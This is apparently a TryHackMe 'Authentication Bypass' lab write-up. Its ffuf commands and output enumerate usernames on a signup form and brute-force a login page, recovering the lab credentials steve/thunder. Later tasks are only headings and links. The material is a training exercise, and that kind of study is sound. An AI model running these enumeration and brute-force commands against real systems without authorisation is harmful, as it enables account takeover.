[TryHackMe | Authentication Bypass](https://tryhackme.com/room/authenticationbypass)

# TryHackMe-Authentication-Bypass
`Learn how to defeat logins and other authentication mechanisms to allow you access to unpermitted areas.`

## Task 1 Brief

## Task 2 Username Enumeration
http://machine_ip/customers/signup

```
root@ip-10-10-25-193:~# ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.50.205/customers/signup -mr "username already exists"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.50.205/customers/signup
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&email=x&password=x&cpassword=x
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: username already exists
________________________________________________

admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77]
simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
:: Progress: [10164/10164] :: Job [1/1] :: 1503 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
root@ip-10-10-25-193:~# 
```

[ffuf/ffuf: Fast web fuzzer written in Go](https://github.com/ffuf/ffuf)

## Task 3 Brute Force
http://machine_ip/customers/login

```
root@ip-10-10-25-193:~# nano valid_usernames.txt
root@ip-10-10-25-193:~# ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.50.205/customers/login -fc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.50.205/customers/login
 :: Wordlist         : W1: valid_usernames.txt
 :: Wordlist         : W2: /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=W1&password=W2
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 200
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1]
    * W1: steve
    * W2: thunder

:: Progress: [400/400] :: Job [1/1] :: 229 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
root@ip-10-10-25-193:~# 
```

## Task 4 Logic Flaw
http://machine_ip/customers/reset

## Task 5 Cookie Tampering
[TryHackMe | HTTP in detail](https://tryhackme.com/room/httpindetail)

[CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)
